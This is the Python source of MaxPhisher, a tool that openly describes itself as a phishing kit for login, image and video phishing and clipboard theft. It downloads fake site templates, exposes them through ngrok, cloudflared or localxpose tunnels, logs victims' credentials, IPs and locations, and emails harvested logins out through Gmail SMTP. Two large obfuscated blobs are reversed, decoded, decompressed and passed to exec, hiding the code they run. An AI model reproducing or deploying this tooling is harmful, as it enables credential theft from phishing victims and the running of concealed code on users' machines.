# -*- coding: UTF-8 -*-
# ToolName   : MaxPhisher
# Author     : KasRoudra
# Version    : 1.0
# License    : GPL V3
# Copyright  : KasRoudra (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: MaxPhisher is a phishing tool in python
# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
# 1st Commit : 29/08/2022
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : PyPhisher, VidPhisher, CamHacker, IP-Tracker, StromBreaker, Seeker
# Env        : #!/usr/bin/env python


"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
"""

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'DB04E496F1DFEFDFF7D3FDD5CA7345444D1188D29DEB6930836D0229E03CCFC7137B88013435D7CB06AF04A720D07FF9C06317CB319DCE073671E796B077AA0C6A43845B28313053407338AC50092BCEB3C61E13371B3E8E6DF10D2DDD28B1C2521950A7E400CE61897E485907732C79D38C0ED123E6DDA19726F0E0B0B0A84E26BC10CAA11F32A718C8B711374E906F596D6738F85373C50B442CB4CBA10E58CD3195C178B339F1BD7EA6AA9DFD5668F9398CD9A041173FB3B1304020C4B42402E2027AD957FD890DAB4EE7F6EB7BDDABBA84E8E5959D2D3C102B90D8A578FA225AE81FAD9F42F02870E0A021DF18A9C8CD7501116D2115716C1FC09DD535170E01504025CCE97B5E981DEAE967A8A7DAD8088DD89EC480938E0C43ED237D4B3CCA0B7F2D3AC43D0A2C96771B826B5B8B955C0C47257B46185CF8E801FEF694225E3400F6282EAAC6AB852186BB1D474FECB99E4D0F026928D9B6F6DEBF9599A4F2B15386367F337476E5280CE6F40DEA51ECFE07A0C7DF547C7795C20D77ED611B4D20504A07E13A9B775E5D08445F5BD0C69EB4A49D4CE2CB7D1911689E9920D502F295D1BEC5AB61ACB5ABF0C45254EA6AE505FA696D6C68D969BB76CA3375BC14916D5279693C0EFE9234A035CE925EF3F29A63783D6C171809AD0F7405A341ABE346DDEC4FDD66488B04A97131AC1A1C4E9BA37B405234336D8C17CB82A45C5B602F55BCD5EEB615C5BD1942825E2D095ACD6A3FDDDAFF4C9FC3B6C8A2520532EEAE5237DE628B222CAD6216E139A912A7D33F8CC612BBD19AD52F74BA9428563BCC7AC1E8CB4BEB41D06FD71272C96DB696F6579E2BCEFE6DA19BFDF04ABB870F8AE11EF4287B1C3666D3D71312FA153BBAD63BDCC5659E3E4BC9E0AC6EE2987F933B36A1285E6B6E162E587994D71A4B47FA3BB9299EDB6B79AE36D96F719624F3485E8F5C691E39C5BEA6EB6ED840AB95B5961FC4CE5FE5A27DECC1DCF0B7AD5C802CB56C7C52B56DD7BDB85E627EE8B2FD74EDA8821DFDE85D8D33ABDCC2B4932BD1B6B15FFEA7116EEDABE5FA7F3FDFAFEFE7E7F7F9FE3F9FFAEE4A9076CEF2C6F57A3E09EEA6A49AA18E01B4108001CEFF33F8488073362D1449D1C987'))

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.0"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red} __  __            ____  _     _     _
{cyan}|  \/  | __ ___  _|  _ \| |__ (_)___| |__   ___ _ __
{yellow}| |\/| |/ _` \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|
{blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
{red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
{yellow}{" "*31}             [{blue}v{version}{yellow}]
{cyan}{" "*28}        [{blue}By {green}KasRoudra{cyan}]
"""

nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://ngrok.com
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4" ]
tunnelers = [ "ngrok", "cloudflared", "loclx" ]
processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from requests import get, Session
from bs4 import BeautifulSoup

# Get Columns of Screen
columns = get_terminal_size().columns

websites_url = f"https://github.com/KasRoudra/MaxPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/MaxPhisher/releases/latest/download/websites.zip" 

# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
sites_dir = f"{home}/.websites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
nr_command = f"{tunneler_dir}/ngrok"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    nr_command = f"termux-chroot {nr_command}"
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"


print(f"\n{info}Please wait!{nc}")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===INR647MA673X7577USTPZGYDMK3VW2N2G4B5ZUF3AU3JGD476XBDMZTCAPGUFN3DOVZ3XN3KYSTV7GCKCFFBNNC2PWX4M7B4N6FD24PKEHI5WZZS7V4537OENIWLXUVHJGWADGHK4COOVA237ADEUP3HGB3LIPAIFPG4JTDQ5V2SMZJDCBAEQ7W3EGF2K3GOIO27IXWYBYEB37QIXD4DF67VNQ2TOAJTDWUAUXIRJWMPYFCMS5YGMBEON6HHUZKHMODX5R3T7UBPABXCPR3IU655KEO7SL34HNFDSQS7BX7KBJ7W2LZXWNYFDSJIB4AHDDY2FPHTRRNNRTWINKLSRWKG3YQTL6B7H3VFVKIHUDXXF256PGBRQZ6EN4S62SZHPS3ZZ4ROXQX2L2TBWC54A5ILJNMO3PZQBELKH5HRF7PRHZYJGSHUUKBC344Y3SGXAPZXRCMZQ5GAGDTZ7LW5CGQDZBURNQGCRQ5NBZPBI7DTVDONGHA3NONI5BTXSBN2L6NJEUFHOEEHYXXEJARO6B2RA6WU3K5E2OWLN427B4PHIJCMMF72Q74DVGRCDNCF7GGGA6J7VHEIBT64DBCSO4QXJJBEONAJ3ACGO6ZQLWJRWITAIWHB2WOBCQZP3SI7DVYXJESXVIDEJTQP4MQ4U4OSVDHUUMX5PRHP4Y2EFJGWM2UUZ3VMRPBFGW65PMDCMKB4SXN3RXFX2CE72XFI5G6HZIRO3YLFIEIX6QBXYHNYKGM3HAUYFTKFUIU7OGN4EYXQ22TEO6FF4MHRCFS5UY3UNQRXENAVIZNYCSDYI73Q3TWYV7HLISE7BLWJZZS66R5BO36WFQTPWJNQMPXBA3M4CE2P6T33S3344TPV7Q35EYLBF5NWO24GIBKMQCDW5ZL53WJTQR4U7UMFIFK2ZMFKVWO5YXTAS7ZNOTD7JECSX3PNAIZBHMXSCIGLDMKQUSOOGGSBYXFN4ZXVGDRSOCUANHTFFPMLZ244LFABJJ5IBW6HUCMOSVV6RORRF3Q63T26WJO6A7GCNAN7F7H6KXETZ4JIBPCGXSERDK2J45CHYNDGPXFWVH4OK3YNAA2XFUFYQ4JILM3PNMF67N6FOZAF6WABPYY6HPTTSVRV4YYQZXQ7O5XSXOS7BASNGEI264LUA6TRO3GHK3TZ3NKM3AIXYSXQQ3YLLNWBB3B5UAULHL6YBQEDV7ZDXIGE735LVRPTS7VIQ5JFZAEHYJD3ZFDZJQBI5GVUOMFTVQGPSGAQQRI5FNPICPATN7NYLUNRRE2ACBK557ZMBHK6M246OW3GP3CLQWRSBBG7LRYPTAXZ2X3VFVDX5HU5FUEDFHC32Z576265BO4EANG24IAIGYAHEH2LNTF2KKJGQ3HIUSQR56JCBDM5D7ZROTWQL4DQME4PPO7RATHM5D6YCMELJEUYSSFSRGZCC4UJ4YP3PSTIQPEGGWYM7UTJK4F5N3NT3NHEKMI34WUMUKNG2NWKPHONTRURXUJZVCUG5H6ZMSAEPZLHBQXU32D6GREYUHO75H6SJ5JDHPD3NJKPZL6UBDDR5GMBQL7APQQY4AIJFMG3HZQFR4PEYO763LLVXDCZSWLYCTWYIRADQI5NXM65IGGNZBFDQ27KF2ELPOTB6N7AK3H4CEHK4QVZSF2KRDEIJLY5UHUBBQ5WYYPDKYDJQFMY72MZS6GJMWBBYX5K6B4NQOCIFDA7MWBF3S4FHOXNFIVLPZCHRXZFJIER2CCZSNAEBH5DJRNSP345BOPSSDLP5PGTMHFRP3KFUNY7GDEALV5VB3XPYDY3FR3OPG6JGVBYZX4TCLYAUAGMCTA2MUVIO3CGQSCMR7PIBWAKIT2FVFLTHHOA7GVWXNY76RJC7W4UNBBEFFRVWYUIJQUZUDNMCAD5QKVAPTQTBUSFWY74L2EZ4CYKZEZ3AAB74PVEHBNQULLTYJATPDJO4FKSBRKVSJU2R6265Q55XH3V2MIM5DOHV6M4RIMQ4B42UCWCJNG7Q33VS2TSXWVTCLE3BEZGRKSBN6NV64LCEV3WEZYARRJQVURHKH7473YHRDGD7KGIQT5JUDZU7WBNR2SLHWW3ATSSSMNAA52IRN65JN3P4M2X4XNDVLOP6AEXVRVYZTG4TUKDQ25DCO633MZOZIDYYYBPO3HUVWNFMDABDSYIYYJTTVJB76QVWBS4NHMSOQ5IVAVUBD2Z7O5O745LMH4CZY6YKXX7MAI47NUTJE2DIAIOQSNUH3XSHE2L4DGZTDRM2R3Z4437AGDTLM5WSTFBUBA2HSYX3OGEFL6RQPDJOKXTMOPF4FIIHCAJZGCTLF2TZR2SDYLONS6JZKU5BJKJ7EESV7EMPRYBDLKAEN3OCVYIIHYLOBKF7XEQN54CH2XSXSLGNYMJ6SCIBD3PN6DAT5A24BZ767K5EZ6J7ZHT65RBCK5Y52DZXICR5SBPXNQ4H4IVH7GKDS5PQYU4PE65FMI346OPAQN4UYMWJZ6KQ7YE4MNMPCNL64UDXMEUT6XQBHLR5FSGUICQL2NESPEQBO755ZQBO7HMQHU6DXD3HYEHQ3LSTPZMWA55G35Z26EFQSOUBPK22X5WJ3XEH56UD5GZ2VQRF3L4Z2DPUUE73FDPABE6JBZEC6B2D7VD4QHAN57ZXK4AAP32U3MJV4C53KXMVFWC4K2RYCJJQNU5EPXSLI4NCVY56MXME7BYIX3D7DWOEWW5JHVXUOHWRZZNDI33XY4HVSHNSKCKZ2DAK2LRBXQW3APVM3HF6RPUBSHARBIDMCO67VDD4WQV5X6HPQ26PLFDIOKRBFTY7PUEBYHHMNG3Z2VNRKYLGH5PPCAMXBQWWORSLWT3OCZEOVJD2IAIZH4S64RQJKA3WQ5ZKBDF7PPTCAEIRBV7MFV3D4SBTFLYW2HKXCX63KQRJSZJQGKKQ7IUR5FYZGEY4TINMN5PGGWJZNK5JXBWXEUCRDAVC255RZYVAF665BVDYJ6DB24C2BWYGQRLO3ISYPVRVPUEHVVC4LBZNGSSCXA47IQ4LMKJH53BOANVB2J6L4W2KHPV7ORB5QBTSL6XUWREATVEHQTBQ4AEAHZTQHBLLFN764UZVGPBLMX7SVBBYAX5BWVGAQACLGJAT3W5BM3DSURBMSEU3FGGKYVPI2NEZE4FCCS6RODDBWMQRNHA7AQMXOVEJMXHBKFIIE7D36FLDKBRWII7GE3UG5FXG5FEZIO2AJBH7SLAFO3SYXSXYBIH4JH44POYAXGYIURBYJ7N52IAJY3RM2KYNHD3HSDN2UAXYTYZ2RLIVEILDJ7X5SMAAD5OO3PGVHUBJRL6B6JPPB2G2UFNPBC35WYGRV44C32F6VIZXMHMF236MOAYRNGZB6YZBCT5X755CL2HOA5NQCZ56CXC3S4UHLFHAXO6BLY3OJI66R3SVHZ7AIAZM6GNC7CC7MGHVZWOU5VKAAYQ5Q7LJMZAKMX32KYJP6FBO3XMELNNWQ5BTYIATCEYL5SKQE4CUTZHQXSXVXNBPC2ARLR2FNTHY7S5S7MSZN3CTOYR7SY2LXTJBU7YKAFVLIGN3Y7DGDQFYVOZJ3ISHSAMOQDQHXQPPZMKCAXXR5UMSMQII7XZ3D3RORVEK6VDDNIJI3QGZ6V4T5KNVAY42ZF745ZOIJXK6YZGB6TA2OYMMLVOCPAMLY5SV6OBYOUACX5M5TEEKAGBPAXUB4X6TWPQBLF2QYJRQYYBW5A4R3D6V6R47LY5ELTLZ7Q3PJP264UVZ3CNA26YAG7TUJNESEKSRVFET4UVIQ77FKOFGRU3AOL5XK4MX2I6K6RNVN5GSL5T7LRPNYJAILL7EMQPDCBI57HGWCSGWMCZ2KNYB6V5V2DKGN2VAQD2SFPHB734ILBIIBUR7EPK2DMZ3AOSBTBLCGVZIFM5BBBNXEQQAYKZXQXC4Z4VWUQH6PD5AAF4VMLJAUYQB4DNFADM2YLHP6NTHOSEA7NJL3FNXOGFDKXJVXDY57IRPIFAHHAVS7TYAHTZKUY2BCA3ST7E2HYUWVQIMSJCH5WRGFXNPTP3MZHQIM25V66P5JAUWULU3GBOURBDCFQXKFB32PRHETUXIEGINIVJYTMYDVVDGRAQFX2LCU6EJOA4LUYBP2POCHKLGRABJQS7DOHUBITJ3PCPXNI4OLEPHEDXZI4MPEQ7JLKUNCEOC4Z22HVHGBSK2MTFEVX2JGASIPRZ5GAJRKDABAKUONBNKACWDPEX7UF67266LEQNDXXE26BHOSPZY24HA2PKCQ7LHN56CBVMNTJFDA64XDP73CWKWXF22WRZRNKGT3JC46HUMHBD76K5N4KTHFBW6XVMV2XXXDUIOVK7GVPPOYRRI6GWC4XMLF4ECJGV2NIZPNX5POZBMDGVC23VH7JHATFMR622GEJU6OHSTWGDZBET5TM5DDPLQGI4HU3ED73DARLQPLQMXCBOWDKVPAAQXFOXTQX2JL253I2ZB5JVT2JEAVHPFJVJNFGQLNGKHNTNFPJDP236D5E7LA6ZN5ENCW4OAX54RELWIKDKX3L4A6BA2DDQ6MLE74DTREY6P4UKVWAAVX3EJNPS6GD6WCTHJAXHKQWJ2UT2PLNZCWUMOL26TQ5MQOEQNJ2LVA3HN2LOH5D7ILXPL7VAECHYERCVCQN5MPUJVI2GI7WR3YX457KNBT6J32NLRZFJLMARRTHHWS2YW6BQQBWXCUHD3R6DU6K6K4DCJH7VDZKRXSNJKEJK2SNARKGKXN2FLWA2IIRD4LEXGLQ4F3XLTOICXGRQUB42ZLWQVX6QNCGAV5AQQWB4GUYTORH5SIIO4DOI6CV3WVBE4RPYSNXNXEDH5SYCHCAIHB7OLNRYDMSTLXZ3W74UFFIQPATWROH7BMPRJHK2EL6QS7PFESS6IGF77THYUXHYUKWAG7VOT7TL5DTPV27MIDNMRABBBBQNRABOTTUSAJLTT2I2WKKNK5XVQE66IQJJ2NBC6CUHA6LMBFGPZOLCAT6OB7VIOZW2LQDCC6YGDS6QFKSQUKNIZJLWIXJBDSA35BXYGDCDY73Q363HNDNQNLKPLQFRRM2IWQWDBRWV5MBYPCYRDBVINO75IZJKKKI6OPSD6J5OUFJRWCEF7NGUF56PVVTEBGBDYPDAGW6K4HGRJKOGHP4ZP4RT5XL7EZUGJU6H3Q4A26TS2SYZDUETVXWEYYA4BA6J72Q6BQGQEXXWMNDZUWPFV5A2MKAB6NWI2KO23WVJPH7NQSFBQOKGXL4YK7KXWVLTHH72VGNBW53XI4XJVWYFBGXVCFE42VIOHOD3K47X5MOQXP2SWF52UHSSLU6M5WZFLLBC6JG4AOII5PUSMORGA3D76TU5D5LD5AWTXHUGZJD3Z3YWB7Z45HO7NWZDD4TYGUYRAFTWZKNGK5H62PVTWYAHYR45Y6R7TK4EHVLVUSZWFMMLANIEBF2RZGIYH34SRM7JG4W2ITXLDPUELRBXYYXD6OHSXFVOIT3A6PT3I6QZBYB74A373DC3DMKDJ5RD6HCDFODBJEGQTIIA2O637YKQSC57EII3PMSHACI5JQFVVEI4AF6AUI4JP5WT5LBPBJ4RX4WY7G5QZEAOMJDETZLK2HF3JZTSCWS2IURY4HILHJFZAPISFAWCL54WLH35P5N3KRFCFG4EHDDPQE2MWTBGOI6GJR6YNCTLSUM3J7TFZYNSHGSEJMOISLENP4M3GX4GZTOKTHOWBSIWWNSZ2I72RD3SO2P6H3OGBFUZT2W67NI64W4T6C4GSNGVHJRHBU4V26HZE2SMA32VHHQNJMVOV7SQIZLBYJXIPGQ2ONUEQ57M76UFZRCVVCYRUK7IDFCE5VCWACKMIRNR7EJLPZAVW3L2JMZU5ZEWHYMJYDELQKUXS2RJP3DDNHBNJPNOV64I4JSVSQDZBV6H3XTQB3D4SQJTP44R6OEUYNVPCFUUSFDCX2YFY4GXO5IOXKWV5KC7SAWQQTRN5HOFFE52NYO33NRGJYGMEC33CHC72NRJQN626KWOUY6Q6NZR5KLLTXKYZVQEY4LEX5M5SL33BENE6UBRUCFQX7LEGXPFW4UUQV3VDIDWU7RL5VHHQGSD7E6F7SV6ZODTP5FPNEMA5IMKSOWXPOEVYVGD4ZCP7WREEY5DPY6YJ537FX55ULKZV7I4Q4BSNSN434ZHQYDXTERVW6ZPREWJZ43XQPMNM5OQ5ILEKXJVFMBLDR6E7XGNBTXDZEXOJEF6HGB43FWXXSR5FW6CW62JW6V7UN3K4VCQZN772FKM7AXPFGNOBZJJDBLJZN6CQCSRNID7WBXGNKF4WFTJFOCJG2TRQI6VC6IJRWU5WAF6RFO6VOATVIJ4QZCRPLZJ7RPCSCPBVZ6OVKGRA4KNKLSMLS2TL3ERINCHD2GHHLWMTHRYS72ZBPFRKMP3KF4VZH33FI2ODB7IX2JT2HJGWHLWVB2RNEJTPQKQHYQZ42WH3MGRKQ72OWBSBW4T6G3DKAUKYWDCF6UHPEVGA6VRR4EFDMJV555WH2NRJPNXOJKU3X22I4KHBTB4AS5EGCVJDSDDPKTCVFT5BQ63ZQOQYM52FIFLPNFJA6WGL5A3OVRQFE3REUF4TW6NXSX3QGSYIPG3UBC24G4YWSC3D2USHVLEL56G6U2WDX5OUKH4CJLQHVPZ4PU5LSW47MA5EHSNYB5DKMC5ED2FQ7IW7FQHIR7IPY4GPJRIMIJCGT4DXKGWUFPDRDY3PAT4IM5XVZT6X3HIRXG2GGBO2MGFK2YTHEB3OO35PJDVNQ24XXGR5MEQ6CC6TEGM55BBVYSYRM6I5QJ7T3I3AZDHOINJKNSENHWEV5KGE6O3EUHSMS4SZH2JNXAVA4CLH5X7E75IO5VTZC5SH4B7FKME3WC2KK5KUZS2WER4VKG42FFJ2OUR3UQ5P3XBNOXCMJM2UHXV4P2DTKPPOOJVTX63TGWZKLO7K3GHVDVP6ZMNVMXARIIR7S6KCJUCYEHZ4TO6FJR4G7KZZEMZDWETWQIECXWWPB5EHQ3CE6YA4I3DICBF7XNP5Q47JMS22X3NFZTOVQFO5W4B4HSK4I5C4XW4K2RA5U5RKLPEJSWGTNY6VERQRR6VMYVJS64OZTUSQK5W7TUY5DNW77CMQMNJ6IFUOSUGHYQJRMC7V6AP3JJ2557EYGTNH5FFJN5EZVELIKZQSP62BRAWC7KMEOJ4D6MSNVBWXHKLX5XY6TIJ3GGVFCIDXO4HCPBSDM3Z56K63SLKAU33CC6YEY5D6ZACG4HRS6FFFGJFAUJVXG3Q3JWKHTYLNDIKEOE3NQYWO4555YGFFXB6KZS7WZJN37OVXJ3UQU3HPMM3LJORTOUHDJHHIYY4W62WPUPOE5MHHWCHZ4THDBJKPW2VWSK6D2JWKEPQOVA772EXRWSP6KZ26LS6IZZGJUOJ7AREBHHEXJSQ5Y7FF43MIAVEB7E6B4GXNV35LLLFZJTNINHE6PFNYTPFUYQMQ6M7JZ2BORIHHUXQZMN5IJKL3Z6UZOUKIL26QL2JOT7NA4MTMCDO7UPMBDEBNOP63TEMQ4XHX7WTX7SPEYGG5XMMT6JIXPEVH2FFJIJFJSM3PZ6EZ3OCRFS7JWFGZ55NKATKH7D53ODJJZRJERCCG2AZOFE5HIVKKK6TPFPAOJWNNKT3VWXJYNH2OZ6WHCUI7QIEKGR2NISJQ7K3Z35O376LVSJT6YW4IZHLQL3GM5RPQO6UR2I64J7GPKD7W7YFGSOY535TNFZCGMBFHN6IRM4RI37RDN7SQOUXZ2LQEUYKEBRXKUJKI4NNTMKXX6T6MTIXBLTN5PUGUD6A2HTXMY66K762NX27HYLETCWM5VI47H25WYSOUELDOYKDLHF6EFIYAVFKIYJN764JDGZFONJBNXMRF5S2QVUDGVHIBQ6ZZDGSBVUDR4UYM5OGJQR5GGBYK7TR6OMLJM5WNGBYDI7OYMJBXMMRJNZK2K4H4LTEWG2L6GJTFHZ7ZSYTPBVB5GPW2TI3JG3652R265LIF2IV4SRIBBGLTP7BWLNWRJIGSCRJVTDGFKMWVQYVJ5HB6722T777HP76ZP77P75ZX777HWOREW5ACWRUL2KZJV4I44374U7P463KKS66SXB2ATHGCAVHHF7O4ZT7HESFUCW3RLOGLBOCP'))

# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name}")
                elif pacman=="apk":
                    shell(f"sudo {pacman} add {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("ngrok"):
            shell("brew install ngrok/ngrok/ngrok")
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()


# Internet Checker
def internet2(host="8.8.8.8", port=53, timeout=10):
    while True:
        try:
            if not update:
                break
            setdefaulttimeout(timeout)
            socket(inet, stream).connect((host, port))
            break
        except Exception as e:
            print(f"\n{error}No internet!\007")
            sleep(2)

def internet():
    connection = HTTPSConnection("8.8.8.8", timeout=5)
    while True:
        try:
            if not update:
                connection.close()
                break
            connection.request("HEAD", "/")
            break
        except:
            print(f"{error}No internet!\n\007")
            sleep(2)
        finally:
            connection.close()
        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: MaxPhisher Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")


# Dowbload files with progress bar(if necessary)
def download(url, path, progress=True):
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    newname = filename if len(filename) <= 12 else filename[:9]+"..."
    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
    try:
        with open(path, "wb") as file:
            internet()
            response = session.get(url, stream=True, timeout=10)
            total_length = response.headers.get('content-length')
            if total_length is None: # no content length header
                file.write(response.content)
            else:
                downloaded = 0
                total_length = int(total_length)
                for data in response.iter_content(chunk_size=4096):
                    downloaded += len(data)
                    file.write(data)
                    max_len = columns - 25
                    done = int(max_len * downloaded / total_length)
                    if progress:
                        # Arrow will progress as the data increases with done
                        arrow = "=" * done
                        # Space will decrease as done increases
                        arrow_space = " " * (max_len - done)
                        newname_space = " " * (14 - len(newname))
                        percentage = round(downloaded * 100 / total_length, 2)
                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}%")
                        stdout.flush()
    except Exception as e:
        remove(path)
        append(e, error_file)
        print(f"\n{error}Download failed due to: {str(e)}")
        pexit()
    # This print fixes the cursor to newline
    print("")


# Extract zip/tar/tgz files
def extract(file, extract_path='.'):
    directory = dirname(extract_path)
    if directory!="" and not isdir(directory):
        mkdir(directory)
    try:
        if ".zip" in file:
            with ZipFile(file, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(file)
                    exit()
            return
        tar = taropen(file, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")
        exit(1)
        

def get_media():
    media_files = []
    for file in listdir(site_dir):
        extension = file.split(".")[-1]
        if extension in extensions:
            if file=="desc.png" or file=="kk.jpg":
                continue
            media_files.append(f"{site_dir}/{file}")
    return media_files

def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
